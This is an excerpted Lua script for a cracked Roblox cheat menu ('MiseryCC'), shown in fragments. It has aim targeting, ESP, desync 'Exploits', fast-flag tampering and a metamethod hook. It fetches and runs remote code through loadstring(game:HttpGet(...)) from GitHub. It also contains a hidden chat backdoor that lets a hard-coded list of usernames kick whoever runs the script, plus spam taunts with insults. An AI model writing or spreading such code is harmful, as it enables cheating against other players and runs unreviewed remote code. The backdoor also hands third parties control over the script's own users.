...
writefile("ProggyClean.ttf", game:HttpGet("https://github.com/ib136691/test123/raw/main/ProggyClean_4.ttf")) -- old https://github.com/f1nobe7650/other/raw/main/ProggyClean.ttf
...
local Visuals = {   
	...
	["Settings"] = { 
		...
		["Image"] = {
			Transparency = 1,
			Data = game:HttpGet("https://raw.githubusercontent.com/xfarzad/Sources/main/gradientdown.png")
		}
	},
}
...
local Math = loadstring(game:HttpGet("https://raw.githubusercontent.com/ib136691/mathtest1/main/New%20Text%20Document%20(3).txt"))(); -- old https://raw.githubusercontent.com/f1nobe7650/Lynx/main/Math.lua
...
local Path = 
	"https://raw.githubusercontent.com/ib136691/assets/main/"
local images = {
...
function ChatMessageHandler(MSG, User)
    if MSG == '$kick' then
        SayMessage('im sorry wont happen again...')
        wait(1)
        SayMessage('goodbye...')
        wait(1)
        Client:Kick('get kicked bitch im him')
    end
...
local Farzaduser = 'uncfarzadwith3kids'
local CallsUser2 = 'ilovetrin0508'
local CallsUser = 'cage'
local KevinUser = 'lonelycatboy136691'
local KevinUser1 = 'UN84277599'

function ChatDetectorFunc(data)
    pcall(function()
        local Name = data.FromSpeaker
        local Message = data.Message
        if tostring(Name) == Farzaduser or tostring(Name) == CallsUser2 or tostring(Name) == CallsUser  or tostring(Name) == KevinUser or tostring(Name) == KevinUser1 then
...
do 
	...
	do
		...
		function Library:Window(Options)
			...
			HolderInline.ClipsDescendants = true
			--
			...
			Tabs.BackgroundColor3 = Color3.new(0.0784,0.0784,0.0784)
		...
		function Library:Page(Properties)
			...
			local RealPage = Instance.new('Frame', Page.Window.Elements.Holder)
			local Left = Instance.new('ScrollingFrame', RealPage)
			local Right = Instance.new('ScrollingFrame', RealPage)
			local UIListLayout = Instance.new('UIListLayout', Left)
			local UIListLayout_2 = Instance.new('UIListLayout', Right)
			local LeftSpace = Instance.new('Frame', Left)
			local RightSpace = Instance.new('Frame', Right)
			--
			...
			--
			RealPage.Name = "Page"
			RealPage.Position = UDim2.new(0,0,0,35)
			RealPage.Size = UDim2.new(1,0,1,-40)
			RealPage.BackgroundColor3 = Color3.new(1,1,1)
			RealPage.BorderSizePixel = 0
			RealPage.BackgroundTransparency = 1
			RealPage.BorderColor3 = Color3.new(0,0,0)
			...
			--
			Right.Name = "Right"
			Right.Position = UDim2.new(1,-5,0,0)
			...
			LeftSpace.Name = "TabLine"
			LeftSpace.Size = UDim2.new(1,0,0,-10)
			LeftSpace.BorderSizePixel = 0
			LeftSpace.BorderColor3 = Color3.new(0,0,0)
			LeftSpace.BackgroundTransparency = 1

			RightSpace.Name = "TabLine"
			RightSpace.Size = UDim2.new(1,0,0,-10)
			RightSpace.BorderSizePixel = 0
			RightSpace.BorderColor3 = Color3.new(0,0,0)
			RightSpace.BackgroundTransparency = 1
	...
	do 
		...
		do 
			...
			utility.drawings["Domain"] = utility:drawObject("Text", {Outline = true, Text = "Cracked", Color = Color3.fromRGB(132, 108, 188)})
			--
			...
			do 
				Messages = {
					...
					["Lunar"] = {
						"Owned By Misery",
						"Misery Misery Misery RAHHHHH",
						"Slammed by Misery",
						"YOU GOT SLAMMED BY Misery",
						"SEEMS LIKE YOU NEED Misery GG/MISERYCC",
						"GG/MISERYCC GG/MISERYCC GG/MISERYCC",
						"GG/MISERYCC <-- THIS WILL LET YOU COPE WITH YOUR ISSUES",
						"WHAT YOU CANT BEAT MISERYCC?",
						"PRO TIP: BUY MISERYCC",
					},
				}
				utx = {
					["symbols"] = {
...
local Window = Library:Window({Size = UDim2.new(0,580,0,600)}) do 
	-- // Rage
	local aiming = Window:Page({Name = "Rage"}) do
		local mainTarget = aiming:Section({Name = "Main", Size = 330}) do 
		...
		-- 
		local targetSettings = aiming:Section({Name = "Settings", Size = 330}) do 
		...
		-- 
		local targetMethods = aiming:Section({Name = "Methods", Size = 330}) do 
		...
		-- 
		local targetPrediction = aiming:Section({Name = "Prediction", Size = 330, Side = "Right"}) do 
		...
		-- 
		local targetChecks = aiming:Section({Name = "Checks", Size = 330, Side = "Right"}) do 
			targetChecks:Dropdown({Name = "Checks", Flag = "Silent Checks", Options = {"Knocked Check", "Wall Check", "Friend Check", "Grabbed Check"}, Max = 9e9})
		end 
		-- 
		local targetStrafe = aiming:Section({Name = "Target Strafe", Size = 330, Side = "Left"}) do 
		...
		-- 
		local targetVisuals = aiming:Section({Name = "Visuals", Size = 330, Side = "Right"}) do 
	...
	-- 	// Esp 
	local esp = Window:Page({Name = "Renders"}) do 
	...
	local visuals = Window:Page({Name = "Visuals"}) do 
		local worldVisuals = visuals:Section({Name = "Lighting", Size = 330, Side = "Left"}) do 
		...
		-- 
		local bulletTracers = visuals:Section({Name = "Bullet Modification", Size = 330, Side = "Left"}) do 
		...
		-- 
		local crosshairSection = visuals:Section({Name = "Crosshair", Size = 330, Side = "Right"}) do 
		...
		-- 
		local ingameCrosshair = visuals:Section({Name = "In-Game Crosshair", Size = 330, Side = "Right"}) do 
	...
	local misc = Window:Page({Name = "Misc"}) do 
		local movementSection = misc:Section({Name = "General", Size = 330}) do 
		...
		-- 
		local hitEffects = misc:Section({Name = "Hit Effects", Size = 330, Side = "Right"}) do 
		...
		-- 
		local characterMods = misc:Section({Name = "Character", Size = 330, Side = "Left"}) do 
		...
		-- 
		local cframeDesync = misc:Section({Name = "Desync", Size = 330, Side = "Left"}) do
			...
			cframeDesync:Toggle({Name = "Enabled", Flag = "Desync"}):Keybind({Name = "Desync Key", Flag = "Desync Key", Mode = "Toggle", Callback = function()
				if flags["Desync Key"] == false then 
		...
		-- 
		local invisDesync = misc:Section({Name = "Exploits", Size = 330, Side = "Left"}) do
			local loop; 
			...
			-- 
			task.spawn(function()
				while wait(0.015) do -- the time of which our replication packets are stable
					local chokeClient, chokeServer = RunService.Heartbeat.Connect(RunService.Heartbeat, function() end), RunService.RenderStepped.Connect(RunService.RenderStepped, function() end); -- the difference between heartbeat versus renderstepped: according to frame, heartbeat = client & renderstepped = server (his word not mine)
		...
		-- 
		local fastFlags = misc:Section({Name = "Fast Flags", Size = 330, Side = "Left"}) do
...
do 
	...
	do
		framework["connections"]["Main Loop"] = RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function(Fps)
			...
			do 
				if flags["Fast Flags"] and getfflag("S2PhysicsSenderRate") ~= flags["Fast Flags Amount"] and not flags["Invis Desync Key"] then 
	...
	do 
		...
		local IndexThing
		IndexThing = hookmetamethod(game, "__index", LPH_NO_VIRTUALIZE(function(self, k)
